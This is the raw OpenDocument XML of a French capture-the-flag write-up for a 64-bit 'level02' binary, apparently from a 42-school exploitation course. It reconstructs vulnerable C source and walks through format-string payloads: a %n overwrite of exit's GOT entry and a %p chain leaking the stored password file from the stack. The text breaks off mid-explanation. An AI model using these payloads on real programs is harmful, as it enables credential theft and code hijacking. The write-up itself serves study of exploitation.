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52100001FA19366DEEA.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003256000016A319FB680A.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003DEA0000221C57F72789.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000314E00001689C871C282.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000040150000200BDAB1C6BB.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000055C9000023C4D0ABBAC8.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000603A0000115EC3B0E791.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000029C2000010DA21A7CB42.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/200000070000343200000B94C044BD4D.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/20000007000027470000110F7B96A38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6" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>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6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="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ed9d13"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#ed9d13" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt"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color="#2490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61632524668611811" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P13">Level 02</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">On est cette fois sur un <text:span text:style-name="T1">binaire 64 bits</text:span><text:span text:style-name="T2">. On reconstruit le code source suivant :</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P8">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P9">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P9">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P9">#include &lt;string.h&gt;</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T5">main</text:span><text:span text:style-name="T7">(</text:span><text:span text:style-name="T3">void</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P11">{</text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T7">i</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T7">n;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0x114]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">long</text:span> <text:s text:c="3"/><text:span text:style-name="T7">l;<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0x120]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">char</text:span> <text:s text:c="3"/><text:span text:style-name="T7">buff[</text:span><text:span text:style-name="T9">96</text:span><text:span text:style-name="T7">];<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0x70]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">char</text:span> <text:s text:c="3"/><text:span text:style-name="T7">buff2[</text:span><text:span text:style-name="T9">41</text:span><text:span text:style-name="T7">];<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0xa0]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">char</text:span> <text:s text:c="3"/><text:span text:style-name="T7">buff3[</text:span><text:span text:style-name="T9">96</text:span><text:span text:style-name="T7">];<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0x110]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">FILE</text:span> <text:s text:c="3"/><text:span text:style-name="T7">*file</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0x8]</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">size_t</text:span> <text:s text:c="3"/><text:span text:style-name="T7">y</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;<text:tab/><text:tab/></text:span><text:span text:style-name="T10">// [rbp-0xc]</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">while</text:span> <text:span text:style-name="T7">(i</text:span> <text:span text:style-name="T7">&lt;</text:span> <text:span text:style-name="T9">96</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">buff[i++]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">i</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">while</text:span> <text:span text:style-name="T7">(i</text:span> <text:span text:style-name="T7">&lt;</text:span> <text:span text:style-name="T9">40</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">buff[i++]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">i</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">while</text:span> <text:span text:style-name="T7">(i</text:span> <text:span text:style-name="T7">&lt;</text:span> <text:span text:style-name="T9">96</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">buff[i++]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">file</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">fopen(</text:span><text:span text:style-name="T12">"/home/users/level03/.pass"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T12">"r"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T7">(file</text:span> <text:span text:style-name="T7">==</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">{</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">fwrite(</text:span><text:span text:style-name="T12">"ERROR: failed to open password file\n"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">0x24</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stderr);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">}</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">y</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">fread(buff2,</text:span> <text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">41</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">file);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">buff2[strcspn(buff2,</text:span> <text:span text:style-name="T12">"\n"</text:span><text:span text:style-name="T7">)]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T7">(y</text:span> <text:span text:style-name="T7">!=</text:span> <text:span text:style-name="T9">41</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">{</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">fwrite(</text:span><text:span text:style-name="T12">"ERROR: failed to read password file\n"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">0x24</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stderr);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">fwrite(</text:span><text:span text:style-name="T12">"ERROR: failed to read password file\n"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T9">0x24</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stderr);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">}</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">fclose(file);</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">"===== [ Secure Access System v1.0 ] ====="</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">"/***************************************\\"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">"| You must login to access this system. |"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">"\\**************************************/"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">printf(</text:span><text:span text:style-name="T12">"--[ Username: "</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T7">fgets(buff,</text:span> <text:span text:style-name="T9">0x64</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stdin);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">buff[strcspn(buff,</text:span> <text:span text:style-name="T12">"\n"</text:span><text:span text:style-name="T7">)]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">printf(</text:span><text:span text:style-name="T12">"--[ Password: "</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">fgets(buff3,</text:span> <text:span text:style-name="T9">0x64</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">stdin);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">buff3[strcspn(buff3,</text:span> <text:span text:style-name="T12">"\n"</text:span><text:span text:style-name="T7">)]</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">'\0'</text:span><text:span text:style-name="T7">;</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">"*****************************************"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">printf(</text:span><text:span text:style-name="T12">"Comparing %s | %s\n"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">buff2,</text:span> <text:span text:style-name="T7">buff3);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T7">(strncmp(buff2,</text:span> <text:span text:style-name="T7">buff3,</text:span> <text:span text:style-name="T9">41</text:span><text:span text:style-name="T7">)</text:span> <text:span text:style-name="T7">==</text:span> <text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">{</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">printf(</text:span><text:span text:style-name="T12">"Greetings, %s!\n"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">buff);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T7">system(</text:span><text:span text:style-name="T12">"/bin/sh"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/><text:span text:style-name="T3">return</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T9">0</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">}</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">printf(buff);</text:span> <text:s text:c="15"/><text:span text:style-name="T10">// Format string vulnerability</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">puts(</text:span><text:span text:style-name="T12">" does not have access!"</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">exit(</text:span><text:span text:style-name="T9">1</text:span><text:span text:style-name="T7">);</text:span></text:p>
      <text:p text:style-name="P6">}</text:p>
      <text:p text:style-name="P15">Le code désassemblé était bien sûr légèrement différent par rapport aux binaires 32 bits, même si globalement la méthode de reconstruction est très similaire.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">En réalité, la seule différence notable était les calling convention des fonctions (voir 42/ASM/ASM64.odt). En effet, les arguments de fonction sont passés comme suit :</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="Emphasis"><text:span text:style-name="T2">RDI, RSI, RDX, RCX, R8, R9, remaining from the stack</text:span></text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">De même, les registres, les adresses, et le contenu des adresses font désormais </text:span><text:span text:style-name="T1">8 bytes </text:span><text:span text:style-name="T2">au lieu de 4. Un exemple simple d'un appel à fopen :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images1" text:anchor-type="paragraph" svg:x="-0.034cm" svg:y="0cm" svg:width="13.361cm" svg:height="2.963cm" draw:z-index="0"><draw:image xlink:href="Pictures/200000070000343200000B94C044BD4D.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Sinon à part ça, pas de difficulté particulière pour reconstruire le code source. On trouve une vulnérabilité de type </text:span><text:span text:style-name="T1">formatstring </text:span><text:span text:style-name="T2">assez évidente à la fin du code, avec un printf qui ne prend pas de chaîne formattée et ne fait qu'afficher une variable que nous contrôlons (Username). On peut vérifier la vulnérabilité assez simplement, en insérant un </text:span><text:span text:style-name="T11">format specifier </text:span><text:span text:style-name="T2">dans le username :</text:span></text:p>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images2" text:anchor-type="paragraph" svg:x="0.085cm" svg:y="0.196cm" svg:width="10.054cm" svg:height="4.367cm" draw:z-index="1"><draw:image xlink:href="Pictures/20000007000027470000110F7B96A385.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T2">Le </text:span><text:span text:style-name="T11">format specifier </text:span><text:span text:style-name="T2">est bien traduit, la vulnérabilité est présente. Attention cependant : nous sommes sur un programme </text:span><text:span text:style-name="T1">x64</text:span><text:span text:style-name="T2">, donc les </text:span><text:span text:style-name="T11">format specifiers</text:span><text:span text:style-name="T2">, lorsqu'ils vont tenter d'afficher les arguments de la fonction printf qui sont censés correspondre aux </text:span><text:span text:style-name="T11">specifiers</text:span><text:span text:style-name="T2">, vont d'abord afficher RSI – RDX – RCX – R8 – R9, avant d'afficher les valeurs sur la stack.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr2" draw:name="images3" text:anchor-type="paragraph" svg:width="18.988cm" svg:height="7.916cm" draw:z-index="2"><draw:image xlink:href="Pictures/20000007000055C9000023C4D0ABBAC8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Il faut prendre cela en compte lorsqu'on tente d'exploit notre vulnérabilité de </text:span><text:span text:style-name="T1">format string</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">De là, j'ai d'abord essayé de reproduire les exploits effectués dans </text:span><text:span text:style-name="T1">Rainfall</text:span><text:span text:style-name="T2">, en utilisant le </text:span><text:span text:style-name="T11">specifier </text:span><text:span text:style-name="T1">%n </text:span><text:span text:style-name="T2">afin d'écrire à des adresses mémoires arbitraires. J'ai vu que la fonction </text:span><text:span text:style-name="T1">exit </text:span><text:span text:style-name="T2">était appelée après notre vulnérabilité de format string, le plan était donc simplement de récupérer l'adresse </text:span><text:span text:style-name="T1">.got.plt</text:span><text:span text:style-name="T2"> de </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2">, et d'y inscrire une adresse arbitraire (typiquement, celle de l'instruction </text:span><text:span text:style-name="T1">system("/bin/sh") </text:span><text:span text:style-name="T2">de la fonction </text:span><text:span text:style-name="T1">main</text:span><text:span text:style-name="T2">).</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Il faut d'abord qu'on calcule le nombre de </text:span><text:span text:style-name="T11">jumpers </text:span><text:span text:style-name="T2">nécessaires afin que notre </text:span><text:span text:style-name="T11">format specifier </text:span><text:span text:style-name="T2">désigne les 8 premiers bytes de notre chaîne de format (qui contiendront notre adresse cible). On remplit notre buffer </text:span><text:span text:style-name="T1">username </text:span><text:span text:style-name="T2">de 'A', et on examine la stack juste avant l'appel à </text:span><text:span text:style-name="T1">printf</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr2" draw:name="images4" text:anchor-type="paragraph" svg:width="13.601cm" svg:height="8.096cm" draw:z-index="3"><draw:image xlink:href="Pictures/200000070000352100001FA19366DEEA.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T2">On se situe à </text:span><text:span text:style-name="T1">23 adresses </text:span><text:span text:style-name="T2">de </text:span><text:span text:style-name="T1">rsp</text:span><text:span text:style-name="T2">. Cela signifie que </text:span><text:span text:style-name="T1">28 format specifiers %p </text:span><text:span text:style-name="T2">(qui affichent et font avancer de 8 bytes) nous permettent d'atteindre le début de notre chaîne de format (pour évacuer les registers RSI – RDX – RCX – R8 - R9). On peut le vérifier simplement :</text:span></text:p>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images5" text:anchor-type="paragraph" svg:x="0.032cm" svg:y="0.275cm" svg:width="10.689cm" svg:height="4.314cm" draw:z-index="4"><draw:image xlink:href="Pictures/20000007000029C2000010DA21A7CB42.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Ici, notre </text:span><text:span text:style-name="T1">%28$p </text:span><text:span text:style-name="T2">pointe directement sur le début de notre </text:span><text:span text:style-name="T1">format string </text:span><text:span text:style-name="T2">composée de 'A'. On peut rédiger cela avec un payload dans un unique fichier avec la même technique que </text:span><text:span text:style-name="T1">Rainfall –</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T1">bonus1</text:span><text:span text:style-name="T2">, en remplissant le buffer des </text:span><text:span text:style-name="T1">fgets</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P16">python -c "print('AAAAAAAA%28\$p' + 'A' * 86 + 'aaaa')" &gt; payload</text:p>
      <text:p text:style-name="P16">./level02 &lt; payload</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">En sachant cela, on veut voir maintenant si l'on peut effectivement se servir du specifier %n afin d'écrire à l'adresse </text:span><text:span text:style-name="T1">.got.plt </text:span><text:span text:style-name="T2">de </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2">. Notre payload est désormais le suivant: </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P16">python -c "print('\x28\x12\x60\x00\x00\x00\x00\x00%28\$n' + 'A' * 86 + 'aaaa')" &gt; payload</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Le %n devrait ici pointer sur 0x0000000000601228, l'adresse .got.plt de exit, et y inscrire un entier (0x8 ici). Le problème est qu'un tel payload ne fonctionne évidemment pas, </text:span><text:span text:style-name="T1">car il contient des NULL BYTES</text:span><text:span text:style-name="T2">. La string s'arrête après les 3 premiers bytes, c'est le problème des adresses </text:span><text:span text:style-name="T1">x64</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Et, bien sûr, si on retire les </text:span><text:span text:style-name="T1">\x00</text:span><text:span text:style-name="T2"> on se retrouve avec une segmentation fault, car le %n attend une adresse de 8 bytes et va considérer que le %28$n constitue le reste de l'adresse après nos 3 premiers bytes :</text:span></text:p>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr2" draw:name="images6" text:anchor-type="paragraph" svg:width="15.85cm" svg:height="8.731cm" draw:z-index="5"><draw:image xlink:href="Pictures/2000000700003DEA0000221C57F72789.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T2">Ici, l'exploit était en réalité bien plus simple. On voit dans la fonction </text:span><text:span text:style-name="T1">main </text:span><text:span text:style-name="T2">que le programme ouvre le fichier </text:span><text:span text:style-name="T1">.pass </text:span><text:span text:style-name="T2">qui nous intéresse, et en place le contenu dans une variable locale </text:span><text:span text:style-name="T1">buff2</text:span><text:span text:style-name="T2"> (afin ensuite de la comparer avec le mot de passe entré par l'utilisateur). Cette variable </text:span><text:span text:style-name="T1">buff2</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P15">&gt; Se situe sur la stack (buffer local).</text:p>
      <text:p text:style-name="P15">&gt; Se situe dans la frame à partir de laquelle printf est appelée.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On peut en réalité se contenter d'utiliser notre faille format string afin de révéler le contenu de </text:span><text:span text:style-name="T1">buff2</text:span><text:span text:style-name="T2"> sur la stack. Juste avant l'appel à printf, la stack a la configuration suivante :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images7" text:anchor-type="paragraph" svg:x="0.049cm" svg:y="0cm" svg:width="15.628cm" svg:height="7.816cm" draw:z-index="6"><draw:image xlink:href="Pictures/20000007000040150000200BDAB1C6BB.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Calculons comme précédemment le nombre de </text:span><text:span text:style-name="T11">jumpers </text:span><text:span text:style-name="T2">dont on aura besoin afin que les specifiers de la fonction </text:span><text:span text:style-name="T1">printf </text:span><text:span text:style-name="T2">affiche le contenu de cet emplacement mémoire.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On se situe à </text:span><text:span text:style-name="T1">17 </text:span><text:span text:style-name="T2">adresses de </text:span><text:span text:style-name="T1">esp </text:span><text:span text:style-name="T2">; en prenant en compte les 5 registers censés contenir les premiers arguments, </text:span><text:span text:style-name="T1">22 specifiers %p </text:span><text:span text:style-name="T2">permettent d'afficher la zone mémoire. De là, notre payload est simple:</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T14">%22$p|%23$p|%24$p|%25$p|%26$p</text:span><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Donner cela en input au programme révèlera la zone mémoire stockant le contenu du fichier </text:span><text:span text:style-name="T1">.pass</text:span><text:span text:style-name="T2"> qu'on souhaite leak. Ce leak prendra la forme d'adresses mémoires (car on utilise %p), il faudra ensuite simplement traduire tout ça en ASCII :</text:span></text:p>
      <text:p text:style-name="P15"/>
